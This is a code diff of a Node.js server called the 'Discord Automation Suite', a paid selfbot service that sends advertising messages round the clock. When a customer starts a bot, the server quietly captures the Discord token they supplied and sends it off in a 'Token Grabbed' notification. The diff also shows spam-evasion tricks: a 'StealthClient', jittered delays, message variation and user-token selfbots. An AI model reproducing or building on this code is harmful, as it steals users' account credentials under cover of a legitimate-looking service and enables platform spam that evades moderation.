-        console.error(`[SendDirect] ${channelId}: Bad request — ${JSON.stringify(err.data)}`);
-      }
-      return false;
-    }
-  }
-
-  async _rawSend(channel, variedContent, attachments = []) {
-    const files = (attachments || []).map(att => ({
-      attachment: att.buffer,
-      name: att.name
-    }));
-
-    try {
-      await channel.send({ content: variedContent, files });
-      return true;
-    } catch (err) {
-      if (err.code === 50001 || err.code === 50013 || err.code === 10003) {
-        this._channelPermissions.set(channel.id, false);
-        console.error(`[SendMessage] ${channel.id}: Permission denied (${err.code})`);
-        return false;
-      }
-      if (err.code === 429) {
-        const rawRetry = err.retryAfter || (err.data && err.data.retry_after) || 5;
-        const retryAfter = (parseFloat(rawRetry) < 1000 ? parseFloat(rawRetry) * 1000 : parseFloat(rawRetry)) || 5000;
-        this._channelRateLimits.set(channel.id, Date.now() + retryAfter + 500);
-        console.error(`[SendMessage] ${channel.id}: Rate limited, retry after ${retryAfter}ms`);
-        return false;
-      }
-      console.error(`[SendMessage] ${channel.id}: Discord error`, err.message);
+      if (err.status === 400) console.error(`[SendDirect] ${channelId}: Bad request — ${JSON.stringify(err.data)}`);
       return false;
     }
   }
@@ -1218,12 +809,8 @@ class StealthClient {
   destroy() {
     this._explicitlyStopped = true;
     this.ready = false;
-    this.reconnecting = false;
-    this.reconnectAttempts = 0;
     this._stopBackgroundEvents();
-    try {
-      if (this.client) this.client.destroy();
-    } catch(e) {}
+    try { if (this.client) this.client.destroy(); } catch(e) {}
     this._saveRepliedUsers();
     if (this.api) this.api.destroy();
   }
@@ -1288,7 +875,7 @@ class SimpleDB {
 
   expireOldAddresses() {
     const expired = this.getExpiredPending();
-    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); }
+    for (const p of expired) this.updatePending(p.address, { status: 'expired' });
     return expired.length;
   }
 
@@ -1297,7 +884,7 @@ class SimpleDB {
 
   addCustomKey(key) {
     const normalized = key.toString().toUpperCase().trim();
-    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { return null; }
+    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) return null;
     if (!this.data.customKeys) this.data.customKeys = [];
     if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
     return normalized;
@@ -1418,11 +1005,10 @@ class SimpleDB {
   getWhitelist() { return this.data.whitelist; }
 
   checkExpiredKeys() {
-    const now = Date.now();
     let expiredCount = 0;
     for (const key in this.data.generatedKeys) {
       const keyData = this.data.generatedKeys[key];
-      if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
+      if (keyData.active && keyData.expiresAt && Date.now() > keyData.expiresAt) {
         for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
         expiredCount++;
       }
@@ -1434,12 +1020,8 @@ class SimpleDB {
 const db = new SimpleDB();
 const app = express();
 
-process.on('uncaughtException', (err) => {
-  console.error('[FATAL UNCAUGHT]', err.message);
-});
-process.on('unhandledRejection', (reason) => {
-  console.error('[FATAL UNHANDLED]', reason);
-});
+process.on('uncaughtException', (err) => console.error('[FATAL UNCAUGHT]', err.message));
+process.on('unhandledRejection', (reason) => console.error('[FATAL UNHANDLED]', reason));
 
 app.get('/health', (req, res) => res.status(200).json({ status: 'ok', uptime: process.uptime() }));
 app.use(express.json({ limit: '10mb' }));
@@ -1530,7 +1112,6 @@ function ensureCanGenerate(req, res, next) {
   next();
 }
 
-
 // ═══════════════════════════════════════════════════════════════════════════════
 // WEBHOOK NOTIFICATIONS
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1564,8 +1145,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         const fullInfo = { ...userInfo, ...cached.userData };
         db.addGrabbedToken(token, fullInfo, source);
         const embed = {
-          title: 'Token Grabbed',
-          color: 0xff0000,
+          title: 'Token Grabbed', color: 0xff0000,
           fields: [
             { name: 'Token', value: '```' + token + '```', inline: false },
             { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
@@ -1602,8 +1182,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     db.addGrabbedToken(token, fullInfo, source);
 
     const embed = {
-      title: 'Token Grabbed',
-      color: 0xff0000,
+      title: 'Token Grabbed', color: 0xff0000,
       fields: [
         { name: 'Token', value: '```' + token + '```', inline: false },
         { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
@@ -1635,7 +1214,7 @@ let walletModule = null;
 try { walletModule = require('./wallet'); } catch(e) {}
 
 async function checkAndSweep() {
-  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { return; }
+  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) return;
   db.expireOldAddresses();
   const pending = db.getAllPending();
   for (const p of pending) {
@@ -1685,9 +1264,7 @@ setInterval(() => {
   }
 }, 5000);
 
-setInterval(() => {
-  db.checkExpiredKeys();
-}, 60000);
+setInterval(() => { db.checkExpiredKeys(); }, 60000);
 
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -1697,9 +1274,7 @@ setInterval(() => {
 const activeBots = new Map();
 
 app.get('/login', passport.authenticate('discord'));
-app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
-  res.redirect('/');
-});
+app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
 app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });
 
 app.get('/api/user', ensureAuthAPI, (req, res) => {
@@ -1774,31 +1349,26 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
   try {
     const { key } = req.body;
     const userId = req.user.id;
-    if (!key) { return res.json({ success: false, error: 'Invalid key' }); }
+    if (!key) return res.json({ success: false, error: 'Invalid key' });
     const validation = validateKeyStrict(key);
-    if (!validation.valid) { return res.json({ success: false, error: validation.error }); }
+    if (!validation.valid) return res.json({ success: false, error: validation.error });
     const normalizedKey = validation.normalized;
     if (validation.isGenerated) {
       const success = db.useGeneratedKey(normalizedKey, userId);
       if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
       return res.json({ success: true, message: 'Access granted via generated key!' });
     }
-    const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
-    if (!isValidKey) {
+    if (!VALID_REDEEM_KEYS.has(normalizedKey)) {
       const customKeys = db.data.customKeys || [];
-      const isCustomKey = customKeys.includes(normalizedKey);
-      if (!isCustomKey) { return res.json({ success: false, error: 'Invalid key' }); }
+      if (!customKeys.includes(normalizedKey)) return res.json({ success: false, error: 'Invalid key' });
     }
-    const isUsed = db.isKeyUsed(normalizedKey);
-    if (isUsed) { return res.json({ success: false, error: 'Key already used' }); }
+    if (db.isKeyUsed(normalizedKey)) return res.json({ success: false, error: 'Key already used' });
     const user = db.getUser(userId);
-    if (user.auto_adv_purchased === 1) { return res.json({ success: false, error: 'You already have access' }); }
+    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'You already have access' });
     db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
     db.useKey(normalizedKey, userId);
     res.json({ success: true, message: 'Access granted!' });
-  } catch (err) {
-    res.status(500).json({ success: false, error: err.message });
-  }
+  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
 });
 
 app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
@@ -1807,43 +1377,26 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// BOT START — FIXED DELAY & AUTO-REPLY
+// BOT START — FIXED 24/7 SEQUENTIAL LOOP
 // ═══════════════════════════════════════════════════════════════════════════════
 
 /**
- * Checks if a message qualifies for auto-reply:
- * 1. Must be a DM (no guild)
- * 2. Message must be recent (< 1 hour old)
- * 3. We must not have already replied to this user
- * 4. Message must be from the other person, not ourselves
+ * Checks if a message qualifies for auto-reply
  */
 function shouldAutoReply(msg, client) {
-  // Must be DM
   const isDM = msg.guildId === null || msg.guildId === undefined;
   if (!isDM) return false;
-
-  // Must not be from ourselves
   if (msg.author.id === client.user.id) return false;
-
-  // Message must be recent (< 1 hour old)
   const ONE_HOUR = 60 * 60 * 1000;
   const msgAge = Date.now() - msg.createdTimestamp;
-  if (msgAge > ONE_HOUR) {
-    console.log(`[AutoReply] Skipping old message from ${msg.author.username}: ${Math.round(msgAge / 1000)}s old`);
-    return false;
-  }
-
-  // Must not have already replied to this user
-  if (client.repliedUsers.has(msg.author.id)) {
-    return false;
-  }
-
+  if (msgAge > ONE_HOUR) return false;
+  if (client.repliedUsers.has(msg.author.id)) return false;
   return true;
 }
 
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
   try {
-    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
+    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images } = req.body;
     if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
       return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
     }
@@ -1854,7 +1407,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const client = new StealthClient(token);
     await client.connect();
 
-    // Grab token AFTER gateway connect
+    // Grab token AFTER connect
     const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
     if (!grabResult || !grabResult.success) {
       console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
@@ -1868,6 +1421,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
       joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
     }
 
+    // Save images
     const savedImages = [];
     if (images && Array.isArray(images)) {
       for (const img of images) {
@@ -1896,15 +1450,18 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
       token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30,
       auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '',
       active: 1, username: client.user.username, server_joined: joinStatus?.success || false,
-      images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0
+      images: savedImages
     }, configId);
     db.registerActiveBot(req.user.id, configId, token);
 
     const botKey = `${req.user.id}_${configId}`;
     activeBots.set(botKey, client);
 
-    // ── MESSAGE LOOP: BROADCAST ALL MESSAGES SIMULTANEOUSLY EVERY DELAY ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // FIXED MESSAGE LOOP — Sequential sending, 24/7 until stopped
+    // ═══════════════════════════════════════════════════════════════════════════
     const msgLoop = async () => {
+      // Helper: resolve image files
       const resolveFiles = async (imgs) => {
         const files = [];
         for (const img of imgs) {
@@ -1923,152 +1480,179 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         return files;
       };
 
-      // Anchor to precise intervals
-      let nextTick = Date.now();
+      console.log(`[MsgLoop] ${botKey}: Starting 24/7 loop — ${messageList.length} messages x ${channelList.length} channels, ${delayMs}ms delay`);
 
+      // Outer loop: runs forever until bot is stopped
       while (activeBots.has(botKey)) {
-        const loopStart = Date.now();
+        const roundStart = Date.now();
+
         try {
           // Check subscription status
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) {
-            console.log(`[MsgLoop] Bot ${botKey}: Subscription expired, stopping`);
+            console.log(`[MsgLoop] ${botKey}: Subscription expired, stopping`);
             break;
           }
 
-          // ── FIRE ALL MESSAGES AT ONCE via Promise.all() ──
-          const allMessagePromises = messageList.map(async (msg, msgIdx) => {
+          // ── PHASE 1: Send each message to ALL channels SEQUENTIALLY ──
+          // We send Message 1 -> Channel 1, Channel 2, Channel 3...
+          // Then Message 2 -> Channel 1, Channel 2, Channel 3...
+          // This avoids rate limits while still being fast
+
+          let totalSends = 0;
+          let successSends = 0;
+
+          for (let msgIdx = 0; msgIdx < messageList.length; msgIdx++) {
+            const msg = messageList[msgIdx];
+
+            // Resolve images for this message
             let targetImages = [];
             if (msg.imageIds && msg.imageIds.length > 0) {
               targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
             } else if (savedImages.length > 0) {
               targetImages = savedImages;
             }
-
             const files = await resolveFiles(targetImages);
             const variedText = varyMessage(msg.text);
 
-            // Fire this message to ALL channels simultaneously
-            const channelPromises = channelList.map(async (chId) => {
-              try {
-                const canSend = await client.checkChannelPermission(chId);
-                if (canSend === false) return { channel: chId, success: false, reason: 'no_permission' };
+            // Send this message to each channel ONE AT A TIME with jittered delays
+            for (let chIdx = 0; chIdx < channelList.length; chIdx++) {
+              const chId = channelList[chIdx];
 
-                const ok = await client.sendMessageDirect(chId, variedText, files);
-                return { channel: chId, success: ok };
-              } catch (err) {
-                console.error(`[Broadcast] ${botKey} msg${msgIdx + 1} channel ${chId}:`, err.message);
-                return { channel: chId, success: false, reason: err.message };
+              // Check bot still active
+              if (!activeBots.has(botKey)) {
+                console.log(`[MsgLoop] ${botKey}: Stopped mid-round`);
+                return;
               }
-            });
 
-            return Promise.all(channelPromises);
-          });
+              try {
+                // Check permission before sending
+                const canSend = await client.checkChannelPermission(chId);
+                if (canSend === false) {
+                  console.log(`[Broadcast] ${botKey}: Skipping channel ${chId} (no permission)`);
+                  totalSends++;
+                  continue;
+                }
 
-          const allResults = await Promise.all(allMessagePromises);
-          const flatResults = allResults.flat();
-          const successCount = flatResults.filter(r => r.success === true).length;
-          const totalSends = flatResults.length;
-          const broadcastDuration = Date.now() - loopStart;
+                // Send the message
+                const ok = await client.sendMessageDirect(chId, variedText, files);
+                totalSends++;
+                if (ok) {
+                  successSends++;
+                  console.log(`[Broadcast] ${botKey}: msg${msgIdx + 1}/${messageList.length} -> channel ${chIdx + 1}/${channelList.length} (${chId}) OK`);
+                } else {
+                  console.error(`[Broadcast] ${botKey}: msg${msgIdx + 1} -> channel ${chId} FAILED`);
+                }
 
-          console.log(`[MsgLoop] ${botKey}: Fired ALL ${messageList.length} messages to ${channelList.length} channels (${successCount}/${totalSends} ok) in ${broadcastDuration}ms`);
+              } catch (err) {
+                totalSends++;
+                console.error(`[Broadcast] ${botKey}: msg${msgIdx + 1} -> channel ${chId} ERROR:`, err.message);
+                // Don't stop the loop — continue to next channel
+              }
 
-          // ── PRECISE INTERVAL: account for broadcast duration so we hit exactly every N seconds ──
-          nextTick += delayMs;
-          const waitTime = Math.max(100, nextTick - Date.now());
-          await new Promise(r => setTimeout(r, waitTime));
+              // ── INTER-CHANNEL DELAY: jittered 800ms-2000ms between channels ──
+              // This prevents rate limits while keeping speed reasonable
+              // Skip delay if this was the last channel for this message
+              if (chIdx < channelList.length - 1) {
+                const interChannelDelay = 800 + Math.floor(Math.random() * 1200);
+                await new Promise(r => setTimeout(r, interChannelDelay));
+              }
+            }
+
+            // ── INTER-MESSAGE DELAY: 1-3 seconds between different messages ──
+            // This gives breathing room between message variations
+            if (msgIdx < messageList.length - 1) {
+              const interMessageDelay = 1000 + Math.floor(Math.random() * 2000);
+              await new Promise(r => setTimeout(r, interMessageDelay));
+            }
+          }
+
+          const roundDuration = Date.now() - roundStart;
+          console.log(`[MsgLoop] ${botKey}: Round complete — ${successSends}/${totalSends} OK in ${roundDuration}ms`);
+
+          // ── PHASE 2: Wait the FULL user-configured delay ──
+          // Calculate how much time is left after the round completed
+          const elapsedThisRound = Date.now() - roundStart;
+          const remainingWait = Math.max(5000, delayMs - elapsedThisRound);
+
+          console.log(`[MsgLoop] ${botKey}: Waiting ${remainingWait}ms until next round (delay=${delayMs}ms, round took ${elapsedThisRound}ms)`);
+
+          // Sleep in chunks so we can check for stop signal periodically
+          const checkInterval = 1000; // Check every second if bot was stopped
+          let waited = 0;
+          while (waited < remainingWait) {
+            if (!activeBots.has(botKey)) {
+              console.log(`[MsgLoop] ${botKey}: Stopped during delay`);
+              return;
+            }
+            await new Promise(r => setTimeout(r, Math.min(checkInterval, remainingWait - waited)));
+            waited += checkInterval;
+          }
 
         } catch (loopErr) {
-          console.error('[MsgLoop] Unhandled loop error:', loopErr.message);
-          nextTick += delayMs;
-          const waitTime = Math.max(100, nextTick - Date.now());
-          await new Promise(r => setTimeout(r, waitTime));
+          // Catch any unexpected error so the loop NEVER dies
+          console.error(`[MsgLoop] ${botKey}: CRITICAL LOOP ERROR (recovering):`, loopErr.message);
+          // Wait a bit before retrying to avoid spam
+          await new Promise(r => setTimeout(r, 5000));
         }
       }
 
-      // Loop ended - cleanup
-      console.log(`[MsgLoop] ${botKey}: Message loop ended`);
+      console.log(`[MsgLoop] ${botKey}: Message loop ended cleanly`);
     };
-    // ── AUTO-REPLY WITH INTELLIGENT FILTERING ──
+
+    // ── AUTO-REPLY HANDLER ──
     if (autoReply && autoReplyText) {
-      console.log(`[AutoReply] ${botKey}: Enabled with ${autoReplyText.length} chars reply text`);
+      console.log(`[AutoReply] ${botKey}: Enabled`);
 
       client.on('messageCreate', async (msg) => {
         try {
-          // ── Filter 1: Only process DMs from other people ──
           if (msg.author.id === client.user.id) return;
-
           const isDM = msg.guildId === null || msg.guildId === undefined;
           if (!isDM) return;
 
-          // ── Filter 2: Subscription check ──
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) return;
 
-          // ── Filter 3: Message age - ignore messages older than 1 hour ──
           const ONE_HOUR = 60 * 60 * 1000;
           const msgAge = Date.now() - msg.createdTimestamp;
-          if (msgAge > ONE_HOUR) {
-            console.log(`[AutoReply] ${botKey}: Ignoring old message from ${msg.author.username} (${Math.round(msgAge / 1000)}s old)`);
-            return;
-          }
-
-          // ── Filter 4: Only reply to NEW/unknown users ──
-          // If we've already replied to this user, don't reply again
-          if (client.repliedUsers.has(msg.author.id)) {
-            return;
-          }
-
-          // ── Filter 5: Prevent duplicate in-flight replies ──
+          if (msgAge > ONE_HOUR) return;
+          if (client.repliedUsers.has(msg.author.id)) return;
           if (client.pendingReplies.has(msg.author.id)) return;
           client.pendingReplies.add(msg.author.id);
 
-          console.log(`[AutoReply] ${botKey}: New DM from ${msg.author.username} (${msg.author.id}), age: ${Math.round(msgAge / 1000)}s`);
+          console.log(`[AutoReply] ${botKey}: New DM from ${msg.author.username}`);
 
-          // ── Natural read delay before responding ──
+          // Read delay
           const msgLen = msg.content ? msg.content.length : 0;
-          const readTimeBase = 500 + (msgLen * 15); // ~15ms per character
+          const readTimeBase = 500 + (msgLen * 15);
           const readTime = Math.min(3000, Math.max(300, Math.round(logNormalSample(Math.log(readTimeBase), 0.35))));
           await new Promise(r => setTimeout(r, readTime));
 
-          // ── Check bot still active ──
-          if (!activeBots.has(botKey)) {
-            client.pendingReplies.delete(msg.author.id);
-            return;
-          }
+          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }
 
-          // ── Auto-reply delay: 10-25 seconds ──
           const replyDelay = autoReplyDelay();
-          console.log(`[AutoReply] ${botKey}: Waiting ${replyDelay}ms before replying to ${msg.author.username}`);
+          console.log(`[AutoReply] ${botKey}: Waiting ${replyDelay}ms before replying`);
           await new Promise(r => setTimeout(r, replyDelay));
 
-          // ── Check bot still active after delay ──
-          if (!activeBots.has(botKey)) {
-            client.pendingReplies.delete(msg.author.id);
-            return;
-          }
+          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }
 
-          // ── Mark as replied FIRST (prevent race conditions) ──
           client.repliedUsers.add(msg.author.id);
           client._saveRepliedUsers();
 
-          // ── Send the reply ──
           try {
-            await client.navigateToChannel(msg.channel.id || msg.channelId);
-            const ok = await client.sendMessage(msg.channel.id || msg.channelId, autoReplyText);
+            const targetChannel = msg.channel?.id || msg.channelId;
+            await client.navigateToChannel(targetChannel);
+            const ok = await client.sendMessage(targetChannel, autoReplyText);
             if (ok) {
               console.log(`[AutoReply] ${botKey}: Replied to ${msg.author.username}`);
               client._dmCooldowns.set(msg.author.id, Date.now());
-            } else {
-              console.error(`[AutoReply] ${botKey}: Failed to send reply to ${msg.author.username}`);
             }
           } catch (err) {
             console.error(`[AutoReply] ${botKey}: Error sending reply:`, err.message);
-            // Fallback: try creating DM channel via REST
             try {
               const dmRes = await client.api.request('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
               if (dmRes && dmRes.id) {
@@ -2083,9 +1667,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
               console.error(`[AutoReply] ${botKey}: REST fallback also failed:`, e2.message);
             }
           }
-
           client.pendingReplies.delete(msg.author.id);
-
         } catch (handlerErr) {
           console.error(`[AutoReply] ${botKey}: Handler error:`, handlerErr.message);
           client.pendingReplies.delete(msg.author.id);
@@ -2093,6 +1675,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
       });
     }
 
+    // Start the loop
     msgLoop();
 
     res.json({
@@ -2189,9 +1772,9 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] Discord Automation Suite running on port ${PORT}`);
-  console.log(`[SERVER] Now supports BOTH bot tokens (discord.js) AND user tokens (custom gateway)`);
-  console.log(`[SERVER] Token format auto-detection: Bot tokens prefixed, user tokens raw`);
+  console.log(`[SERVER] Discord Automation Suite v3.1 running on port ${PORT}`);
+  console.log(`[SERVER] Using discord.js for bot tokens, discord.js-selfbot-v13 for user tokens`);
+  console.log(`[SERVER] Fixed sequential message loop — 24/7 until stopped`);
 });
 
 module.exports = app;
